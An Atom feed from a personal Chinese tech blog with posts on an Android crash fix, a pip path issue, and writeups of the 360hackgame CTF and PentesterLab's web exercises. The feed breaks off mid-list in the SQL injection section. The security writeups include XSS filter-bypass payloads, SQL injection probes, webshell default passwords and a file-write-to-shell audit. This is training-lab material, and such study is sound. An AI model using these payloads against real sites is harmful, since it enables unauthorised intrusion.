<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Edward_L's Blog]]></title>
  <subtitle><![CDATA[活着就是为了折腾]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://edward-l.github.io/"/>
  <updated>2015-05-12T16:00:25.000Z</updated>
  <id>http://edward-l.github.io/</id>
  
  <author>
    <name><![CDATA[Edward_L]]></name>
    <email><![CDATA[linzhexi777@gmail.com]]></email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[requestWindowFeature(Window.FEATURE_NO_TITLE)导致程序崩溃]]></title>
    <link href="http://edward-l.github.io/2015/05/12/requestWindowFeature/"/>
    <id>http://edward-l.github.io/2015/05/12/requestWindowFeature/</id>
    <published>2015-05-12T15:06:16.000Z</published>
    <updated>2015-05-12T16:00:25.000Z</updated>
    <content type="html"><![CDATA[<p>最近为了国赛开始看安卓了，这几天写的时候发现只要一些这个就会崩溃<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">requestWindowFeature</span>(Window<span class="class">.FEATURE_NO_TITLE</span>);</span><br></pre></td></tr></table></figure></p>
<p>找了个代替的方法记录一下,上面的是继承了<code>Activity</code>,我们改为继承<code>ActionBarActivity</code>然后把上面的代码换成<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android.support.v7.app.<span class="type">ActionBar</span> actionBar= getSupportActionBar<span class="literal">()</span>;</span><br><span class="line">actionBar.hide<span class="literal">()</span>;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近为了国赛开始看安卓了，这几天写的时候发现只要一些这个就会崩溃<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pr]]>
    </summary>
    
      <category term="Andriod" scheme="http://edward-l.github.io/tags/Andriod/"/>
    
      <category term="Android" scheme="http://edward-l.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[360hackgame]]></title>
    <link href="http://edward-l.github.io/2015/05/08/360hackgame/"/>
    <id>http://edward-l.github.io/2015/05/08/360hackgame/</id>
    <published>2015-05-08T13:30:16.000Z</published>
    <updated>2015-05-09T02:41:36.000Z</updated>
    <content type="html"><![CDATA[<h3 id="第一关">第一关</h3><p>提示要从<code>hack.360.cn</code>进去，改一下refere就可以了。</p>
<h3 id="第二关">第二关</h3><p>让我们找密码？那就找了～结果找到了这样一段js代码～<br><a id="more"></a></p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"Public/js/encode.js"</span> language=<span class="string">"javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> password = eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(parseInt(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="type">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!''.replace(/^/,<span class="type">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;<span class="keyword">return</span> d[e]&#125;];e=function()&#123;<span class="keyword">return</span>'\\w+'&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(new <span class="type">RegExp</span>('\\b'+e(c)+'\\b','g'),k[c]);<span class="keyword">return</span> p;&#125;('<span class="number">9</span> <span class="number">5</span>$=[<span class="string">"\\8\\3\\4\\3\\2\\2\\1\\3\\2\\3\\3\\2\\2\\7\\3\\1\\4\\1\\3\\2\\1\\3\\1\\3\\2\\2\\2\\1\\3\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\2\\1\\3\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\2\\1\\3\\1\\3\\2\\2"</span>];<span class="number">6</span> c()&#123;e[<span class="string">"\\f\\g\\d\\a\\b"</span>](<span class="number">5</span>$[<span class="number">0</span>])&#125;',<span class="number">17</span>,<span class="number">17</span>,'|x2b|x5d|x5b|x21|_|function|x29|x28|<span class="keyword">var</span>|x72|x74|<span class="type">O0</span>|x65|window|x61|x6c'.split('|'),<span class="number">0</span>,&#123;&#125;));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>看起好烦啊，那就输出看看咯。<br>先在本地调试看看<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(parseInt(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="type">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!''.replace(/^/,<span class="type">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;<span class="keyword">return</span> d[e]&#125;];e=function()&#123;<span class="keyword">return</span>'\\w+'&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(new <span class="type">RegExp</span>('\\b'+e(c)+'\\b','g'),k[c]);<span class="keyword">return</span> p;&#125;('<span class="number">9</span> <span class="number">5</span>$=[<span class="string">"\\8\\3\\4\\3\\2\\2\\1\\3\\2\\3\\3\\2\\2\\7\\3\\1\\4\\1\\3\\2\\1\\3\\1\\3\\2\\2\\2\\1\\3\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\2\\1\\3\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\1\\4\\1\\3\\2\\2\\1\\3\\1\\3\\2\\2"</span>];<span class="number">6</span> c()&#123;e[<span class="string">"\\f\\g\\d\\a\\b"</span>](<span class="number">5</span>$[<span class="number">0</span>])&#125;',<span class="number">17</span>,<span class="number">17</span>,'|x2b|x5d|x5b|x21|_|function|x29|x28|<span class="keyword">var</span>|x72|x74|<span class="type">O0</span>|x65|window|x61|x6c'.split('|'),<span class="number">0</span>,&#123;&#125;));</span><br><span class="line">document.write(_$)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>结果来了一个jsfuck的一段代码。<br>解一下，get flag！</p>
<h3 id="第三关">第三关</h3><p>解码？给了这么一段16进制</p>
<p><em><br>0x253444253534253435253335253439253434<br>25343525373725344425353325343125373825<br>34442534342536372536372534462535342536<br>42253637253444253534253435253738253439<br>25343425343525373725344625353325343125<br>37382534442534342534352536372534442535<br>34253435253332253439253434253435253738<br>25344425353325343125333125344425353325<br>34312533312534452534332534312533302534<br>46253433253431253344
</em></p>
<p>先转ascii，</p>
<p><em><br>%4D%54%45%35%49%44%45%77%4D%53%41%78%4D<br>%44%67%67%4F%54%6B%67%4D%54%45%78%49%44<br>%45%77%4F%53%41%78%4D%44%45%67%4D%54%45<br>%32%49%44%45%78%4D%53%41%31%4D%53%41%31<br>%4E%43%41%30%4F%43%41%3D
</em></p>
<p>urldecode</p>
<p><em><br>MTE5IDEwMSAxMDggOTkgMTExIDEwOSAxMDEgMTE2IDExMSA1MSA1NCA0OCA=
</em></p>
<p>ase64decode</p>
<p><em><br>119 101 108 99 111 109 101 116 111 51 54 48 
</em></p>
<p>to ascii</p>
<p><em><br>welcometo360
</em></p>
<p>done!</p>
<h3 id="第四关">第四关</h3><p>发现图片后面还有一个图片。然后。。。。</p>
<h3 id="第五关">第五关</h3><p>google.<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php <span class="string">spy:</span> angel  </span><br><span class="line">aspx <span class="string">spy:</span> admin  </span><br><span class="line">jsp <span class="string">spy:</span> ninty</span><br></pre></td></tr></table></figure></p>
<h3 id="第六关">第六关</h3><p>之前做到过。一开始想到的时bat，后来想到vim的就swp了。然后发现了这么一坨。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">echo</span> htmlsepcialchars(<span class="variable">$str</span>); &#125; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(<span class="variable">$method</span>,<span class="variable">$args</span>)</span> </span><br><span class="line"> </span>&#123; <span class="keyword">if</span>( <span class="number">0</span> === strcasecmp(<span class="variable">$method</span>,ACTION_NAME.C(<span class="string">'ACTION_SUFFIX'</span>))) </span><br><span class="line"> &#123; <span class="keyword">if</span>(method_exists(<span class="variable">$this</span>,<span class="string">'_empty'</span>)) &#123; <span class="variable">$this</span>-&gt;_empty(<span class="variable">$method</span>,<span class="variable">$args</span>); &#125;</span><br><span class="line"> <span class="keyword">elseif</span>(file_exists_case(C(<span class="string">'TEMPLATE_NAME'</span>)))&#123; <span class="variable">$this</span>-&gt;display(); &#125;</span><br><span class="line"> <span class="keyword">elseif</span>(function_exists(<span class="string">'__hack_action'</span>)) &#123; __hack_action(); &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123; _404(L(<span class="string">'_ERROR_ACTION_'</span>).<span class="string">':'</span>.ACTION_NAME); &#125; &#125;<span class="keyword">else</span></span><br><span class="line"> &#123; <span class="keyword">switch</span>(strtolower(<span class="variable">$method</span>)) </span><br><span class="line"> &#123; <span class="keyword">case</span> <span class="string">'ispost'</span> : <span class="keyword">case</span> <span class="string">'isget'</span> : <span class="keyword">case</span> <span class="string">'ishead'</span> : <span class="keyword">case</span> <span class="string">'isdelete'</span> : <span class="keyword">case</span> <span class="string">'isput'</span> : <span class="keyword">return</span> strtolower</span><br><span class="line"> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) == strtolower(substr(<span class="variable">$method</span>,<span class="number">2</span>)); </span><br><span class="line"> <span class="keyword">case</span> <span class="string">'_get'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$_GET</span>;<span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'_post'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$_POST</span>;<span class="keyword">break</span>; </span><br><span class="line">  <span class="keyword">case</span> <span class="string">'_put'</span> : parse_str(file_get_contents(<span class="string">'php://input'</span>), <span class="variable">$input</span>);<span class="keyword">break</span>; </span><br><span class="line">  <span class="keyword">case</span> <span class="string">'_param'</span> : <span class="keyword">switch</span>(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) </span><br><span class="line"> &#123; <span class="keyword">case</span> <span class="string">'POST'</span>: <span class="variable">$input</span> = <span class="variable">$_POST</span>; <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'PUT'</span>: parse_str(file_get_contents(<span class="string">'php://input'</span>), <span class="variable">$input</span>); </span><br><span class="line"> <span class="keyword">break</span>; <span class="keyword">default</span>: <span class="variable">$input</span> = <span class="variable">$_GET</span>; &#125; <span class="keyword">if</span>(C(<span class="string">'VAR_URL_PARAMS'</span>))</span><br><span class="line"> &#123; <span class="variable">$params</span> = <span class="variable">$_GET</span>[C(<span class="string">'VAR_URL_PARAMS'</span>)]; <span class="variable">$input</span> = array_merge(<span class="variable">$input</span>,<span class="variable">$params</span>); &#125;</span><br><span class="line">  <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'_request'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$_REQUEST</span>; <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'_session'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$_SESSION</span>; <span class="keyword">break</span>; </span><br><span class="line">   <span class="keyword">case</span> <span class="string">'_cookie'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$_COOKIE</span>; <span class="keyword">break</span>; </span><br><span class="line">   <span class="keyword">case</span> <span class="string">'_server'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$_SERVER</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'_globals'</span> : <span class="variable">$input</span> =&amp; <span class="variable">$GLOBALS</span>; <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">default</span>: throw_exception(<span class="keyword">__CLASS__</span>.<span class="string">':'</span>.<span class="variable">$method</span>.L(<span class="string">'_METHOD_NOT_EXIST_'</span>)); &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$args</span>[<span class="number">0</span>])) &#123; <span class="variable">$data</span> = <span class="variable">$input</span>; &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$input</span>[<span class="variable">$args</span>[<span class="number">0</span>]])) </span><br><span class="line">    &#123; <span class="variable">$data</span> = <span class="variable">$input</span>[<span class="variable">$args</span>[<span class="number">0</span>]]; <span class="variable">$filters</span> = <span class="keyword">isset</span>(<span class="variable">$args</span>[<span class="number">1</span>])?<span class="variable">$args</span>[<span class="number">1</span>]:C(<span class="string">'DEFAULT_FILTER'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$filters</span>) &#123; <span class="variable">$filters</span> = explode(<span class="string">','</span>,<span class="variable">$filters</span>); <span class="keyword">foreach</span>(<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>)</span><br><span class="line">&#123; <span class="keyword">if</span>(function_exists(<span class="variable">$filter</span>)) &#123; <span class="variable">$data</span> = is_array(<span class="variable">$data</span>)?array_map(<span class="variable">$filter</span>,<span class="variable">$data</span>):<span class="variable">$filter</span>(<span class="variable">$data</span>); &#125;</span><br><span class="line"> &#125; &#125; &#125;<span class="keyword">else</span>&#123; <span class="variable">$data</span> = <span class="keyword">isset</span>(<span class="variable">$args</span>[<span class="number">2</span>])?<span class="variable">$args</span>[<span class="number">2</span>]:<span class="keyword">NULL</span>; &#125; <span class="keyword">return</span> <span class="variable">$data</span>; &#125; &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_getNextKey</span><span class="params">()</span></span><br><span class="line">   </span>&#123; <span class="variable">$str</span> = base64_encode(<span class="string">"p7367p0r578pn8ons4n44p9qs9sqrq4s82c4372b97049560dfae1865e668fb3a"</span>);</span><br><span class="line">    <span class="keyword">return</span> md5(<span class="variable">$str</span>); &#125; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; <span class="keyword">if</span>(C(<span class="string">'LOG_RECORD'</span>)) Log::save(); tag(<span class="string">'action_end'</span>); &#125; &#125;</span><br></pre></td></tr></table></figure>
<p>根据这个就能拿到flag了<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">str</span> = base64_encode(<span class="string">"p7367p0r578pn8ons4n44p9qs9sqrq4s82c4372b97049560dfae1865e668fb3a"</span>); <span class="keyword">return</span> md5($<span class="keyword">str</span>);</span><br></pre></td></tr></table></figure></p>
<h3 id="第七关">第七关</h3><p>无限脑洞题</p>
<p><code>Lilei20140305</code></p>
<h3 id="第八关">第八关</h3><p>代码审计，尝试了很多很多很多次之后终于过了＝。＝</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>('<span class="keyword">template</span>/' . $lang . '.php.html');</span><br></pre></td></tr></table></figure>
<p>对传进来的$lang没有过滤，直接include进来可能导致文件包含漏洞。</p>
<p> <code>preg_replace /e</code> 这个/e可以造成代码执行漏洞。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$default_path</span>))</span><br><span class="line">  mkdir(<span class="variable">$default_path</span>, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">  <span class="variable">$destination</span> = <span class="variable">$default_path</span> . basename(<span class="variable">$filename</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Saving your image to: '</span> . <span class="variable">$destination</span>;</span><br><span class="line">  <span class="variable">$jfh</span> = fopen(<span class="variable">$destination</span>, <span class="string">'w'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"can't open file"</span>);</span><br><span class="line">  fwrite(<span class="variable">$jfh</span>, <span class="variable">$GLOBALS</span>[<span class="string">'HTTP_RAW_POST_DATA'</span>]);</span><br></pre></td></tr></table></figure>
<p>这里他创建了一个777的目录，然后写入，文件名没有过滤，可以显示相对路径，$HTTP_RAW_POST_DATA 可以使用post往文件里写shell，直接getshell。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">file_get_contents</span><span class="params">($templateFile)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>可以返回文件源码。</p>
<h3 id="第九关">第九关</h3><p>xss</p>
<h3 id="第十关">第十关</h3><p>没搞定，看了writeup<br>把应该是把cookie中的display当作get参数交了。然后在乌云上找了个洞就getflag了～</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="第一关">第一关</h3><p>提示要从<code>hack.360.cn</code>进去，改一下refere就可以了。</p>
<h3 id="第二关">第二关</h3><p>让我们找密码？那就找了～结果找到了这样一段js代码～<br>]]>
    
    </summary>
    
      <category term="360hackgame" scheme="http://edward-l.github.io/tags/360hackgame/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[pip安装库时遇到的问题]]></title>
    <link href="http://edward-l.github.io/2015/04/30/pip%E5%AE%89%E8%A3%85%E5%BA%93%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://edward-l.github.io/2015/04/30/pip安装库时遇到的问题/</id>
    <published>2015-04-30T02:30:16.000Z</published>
    <updated>2015-04-30T02:36:16.000Z</updated>
    <content type="html"><![CDATA[<p>昨天晚上想要新装一个库，但是发现直接<code>sudo pip install</code>安装提示成功，但是直接在import的时候提示没有这个库，奇怪，又试着重新安装提示已经安装过了，然后看了下他的路径发现了一些问题。<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"><span class="keyword">import</span> sys</span></span><br><span class="line">sys.path</span><br></pre></td></tr></table></figure></p>
<p>发现直接在终端里用python的时候它居然跑到了MAMP里的python，然后我直接用<code>pip</code>或者<code>easy_install</code>安装的库在<code>/Library/Python/2.7/site-packages/</code>所以自然就不能就调用了,看了下,MAMP中的python是一个软链接，直接改掉了MAMP中python的名字，这样他就直接调用了Library中的了，问题解决。看来还是MAMP的问题。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>昨天晚上想要新装一个库，但是发现直接<code>sudo pip install</code>安装提示成功，但是直接在import的时候提示没有这个库，奇怪，又试着重新安装提示已经安装过了，然后看了下他的路径发现了一些问题。<br><figure class="highli]]>
    </summary>
    
      <category term="MAMP" scheme="http://edward-l.github.io/tags/MAMP/"/>
    
      <category term="pip" scheme="http://edward-l.github.io/tags/pip/"/>
    
      <category term="python" scheme="http://edward-l.github.io/tags/python/"/>
    
      <category term="python" scheme="http://edward-l.github.io/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[web_for_pentest writeup]]></title>
    <link href="http://edward-l.github.io/2015/04/24/web_for_pentest%20writeup/"/>
    <id>http://edward-l.github.io/2015/04/24/web_for_pentest writeup/</id>
    <published>2015-04-24T13:30:16.000Z</published>
    <updated>2015-04-24T13:37:19.000Z</updated>
    <content type="html"><![CDATA[<p>A few days ago, I did web for pentest from PentesterLab.Now, this is the writeup form PentesterLab.You also can go <a href="https://pentesterlab.com/exercises/web_for_pentester/course" target="_blank" rel="external">here</a> to read the integral writeup.You also can go to <a href="http://lightless.me/archives/web-for-pentest-writeup.html" target="_blank" rel="external">lightless’s blog</a> , my thoughts are similar with him.<br><a id="more"></a></p>
<h2 id="XSS">XSS</h2><h3 id="Example_1">Example 1</h3><p>The first vulnerable example is just here to get you started with what is going on when you find a XSS. Using the basic payload, you should be able to get an alert box.</p>
<p>Make sure that you check the source code of the HTML page to see that the information you sent as part of the request is echoed back without any HTML encoding.</p>
<h3 id="Example_2">Example 2</h3><p>In the second example, a bit of filtering is involved. The web developer added some regular expressions, to prevent the simple XSS payload from working.</p>
<p>If you play around, you can see that <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code> are filtered. One of the most basic ways to bypass these types of filters is to play with the case: if you try <code>&lt;sCript&gt;</code> and <code>&lt;/sCRIpt&gt;</code> for example, you should be able to get the alert box.</p>
<h3 id="Example_3">Example 3</h3><p>You notified the developer about your bypass. He has added more filtering, wich now seems to prevent your previous payload. However, he is making a terrible mistake in his code (which was also present in the previous code)…</p>
<p>If you keep playing around, you will realise that if you use Pentest<code>&lt;script&gt;</code>erLab for payload, you can see PentesterLab in the page. You can probably use that to get <code>&lt;script&gt;</code> in the page, and your alert box to pop up.</p>
<h3 id="Example_4">Example 4</h3><p>In this example, the developer decided to completely blacklist the word script: if the request matches script, the execution stops.</p>
<p>Fortunately (or unfortunately depending on what side you are on), there are a lot of ways to get JavaScript to be run (non-exhaustive list):</p>
<blockquote>
<ul>
<li>with the <code>&lt;a</code> tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick …</li>
<li>with the <code>&lt;a</code> tag directly in the URL: <code>&lt;a href=&#39;javascript:alert(1)&#39;...</code> (you will need to click the link to trigger the JavaScript code and remember that this won’t work since you cannot use script in this example).</li>
<li>with the <code>&lt;img</code> tag directly with the event onerror: <code>&lt;img src=&#39;zzzz&#39; onerror=&#39;alert(1)&#39; /&gt;.</code></li>
<li>with the <code>&lt;div</code> tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick…</li>
<li>…</li>
</ul>
</blockquote>
<p>You can use any of these techniques to get the alert box to pop-up.</p>
<h3 id="Example_5">Example 5</h3><p>In this example, the <code>&lt;script&gt;</code> tag is accepted and gets echoed back. But as soon as you try to inject a call to alert, the PHP script stops its execution. The problem seems to come from a filter on the word alert.</p>
<p>Using JavaScript’s eval and String.fromCharCode(), you should be able to get an alert box without using the word alert directly. String.fromCharCode() will decode an integer (decimal value) to the corresponding character.</p>
<p>You can write a small tool to transform your payload to this format using your favorite scripting language.</p>
<p>Using this trick and the ascii table, you can easily generate the string: alert(1) and call eval on it.</p>
<p>Another easier bypass is to use the functions prompt or confirm in Javascript. They are less-known, but will give you the same result.</p>
<h3 id="Example_6">Example 6</h3><p>Here, the source code of the HTML page is a bit different. If you read it, you will see that the value you are sending is echoed back inside JavaScript code. To get your alert box, you will not need to inject a script tag, you will just need to correctly complete the pre-existing JavaScript code and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using //) or by adding some dummy code (var $dummy = “) to close it correctly.</p>
<h3 id="Example_7">Example 7</h3><p>This example is similar to the one before. This time, you won’t be able to use special characters, since they will be HTML-encoded. As you will see, you don’t really need any of these characters.</p>
<p>This issue is common in PHP web applications, because the well-known function used to HTML-encode characters (htmlentities) does not encode single quotes (‘), unless you told it to do so, using the ENT_QUOTES flag.</p>
<h3 id="Example_8">Example 8</h3><p>Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted PHP_SELF which is the path provided by the user. It’s possible to manipulate the path of the application in order to:</p>
<blockquote>
<ul>
<li>call the current page (however you will get an HTTP 404 page);</li>
<li>get a XSS payload in the page.</li>
</ul>
</blockquote>
<p>This can be done because the current configuration of the server will call /xss/example8.php when any URL matching /xss/example8.php/… is accessed. You can simply get your payload inside the page by accessing /xss/example8.php/[XSS_PAYLOAD]. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box.</p>
<p>Trusting the path provided by users is a common mistake, and it can often be used to trigger XSS, as well as other issues. This is pretty common in pages with forms, and in error pages (404 and 500 pages).</p>
<h3 id="Example_9">Example 9</h3><p>This example is a DOM-based XSS. This page could actually be completely static and still be vulnerable.</p>
<p>In this example, you will need to read the code of the page to understand what is happening. When the page is rendered, the JavaScript code uses the current URL to retrieve the anchor portion of the URL (#…) and dynamically (on the client side) write it inside the page. This can be used to trigger a XSS vulnerability, if you use the payload as part of the URL.</p>
<h2 id="SQL_injections">SQL injections</h2><p>SQL injections are one of the most common (web) vulnerabilities. All SQL injections exercises, found here, use MySQL for back-end. SQL injections come from a lack of encoding/escaping of user-controlled input when included in SQL queries.</p>
<p>Depending on how the information gets added in the query, you will need different things to break the syntax. There are three different ways to echo information in a SQL statement:</p>
<blockquote>
<ul>
<li>Using quotes: single quote or double quote.</li>
<li>Using back-ticks.</li>
<li>Directly.</li>
</ul>
</blockquote>
<p>For example, if you want to use information as a string you can do:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> name=<span class="string">"root"</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>or<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> name=<span class="string">'root'</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>If you want to use information as an integer you can do:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id=<span class="number">1</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>And finally, if you want to use information as a column name, you will need to do:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> name;</span></span><br></pre></td></tr></table></figure></p>
<p>or<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`name`</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>It’s also possible to use an integer as string, but it will be slower:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id=<span class="string">'1'</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>The way information is echoed back, and even what separator is used, will decide the detection technique to use. However, you don’t have this information, and you will need to try to guess it. You will need to formulate hypotheses and try to verify them. That’s why spending time poking around with the examples on the liveCD is so important.</p>
<h3 id="Example_1-1">Example 1</h3><p>In this first example, we can see that the parameter is a string, and we can see one line in the table. To understand the server side code, we need to start poking around:</p>
<blockquote>
<ul>
<li>If we add extra characters like “1234”, using ?name=root1234, no record is displayed in the table. From here, we can guess that the request uses our value in some kind of matching.</li>
<li>If we inject spaces in the request, using ?name=root+++ (after encoding), the record is displayed. MySQL (by default) will ignore trailing spaces in the string when performing the comparison.</li>
<li>If we inject a double quote, using ?name=root”, no record is displayed in the table.</li>
<li>If we inject a single quote, using ?name=root’, the table disappears. We probably broke something…</li>
</ul>
</blockquote>
<p>From this first part, we can deduce that the request must look like:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name=<span class="string">'[INPUT]'</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>Now, let’s verify this hypothesis.</p>
<p>If we are right, the following injections should give the same results.</p>
<blockquote>
<ul>
<li>?name=root’ and ‘1’=’1: the quote in the initial query will close the one at the end of our injection.</li>
